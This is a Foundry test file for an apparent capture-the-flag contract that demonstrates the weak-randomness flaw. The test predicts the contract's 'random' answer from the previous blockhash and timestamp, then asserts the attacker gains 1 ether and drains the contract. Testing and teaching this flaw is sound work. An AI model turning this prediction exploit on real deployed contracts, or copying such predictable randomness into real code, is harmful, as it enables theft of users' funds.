
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {GuessTheRandomNumberChallenge} from "../src/GuessTheRandomNumberChallenge.sol";

contract TestWeakRandomnessGuessTheRandomNumberChallenge is Test {
    GuessTheRandomNumberChallenge public _contractUnderTest;

    function setUp() public {
        vm.deal(address(this), 10 ether);
        _contractUnderTest = new GuessTheRandomNumberChallenge{value: 1 ether}();
    }

    function test_highlightPredictableRandomValue(uint256 blockTimestamp, uint256 blockNumber) public {
        vm.assume(blockTimestamp >= block.timestamp);
        vm.assume(blockNumber > block.number + 1);
        vm.assume(blockNumber < type(uint256).max - 2);

        vm.warp(blockTimestamp);
        vm.roll(blockNumber);

        bytes32 prevBlockHash = blockhash(block.number - 1);
        uint8 predictedAnswer = uint8(
            uint256(keccak256(abi.encodePacked(prevBlockHash, block.timestamp)))
        );

        uint256 attackerInitialBalance = address(this).balance;

        _contractUnderTest.guess{value: 1 ether}(predictedAnswer);

        uint256 attackerFinalBalance = address(this).balance;

        assertEq(
            attackerFinalBalance,
            attackerInitialBalance + 1 ether,
            "Attacker should profit 1 ether by predicting randomness"
        );
        assertTrue(_contractUnderTest.isComplete(), "Contract balance should be drained");
    }
}
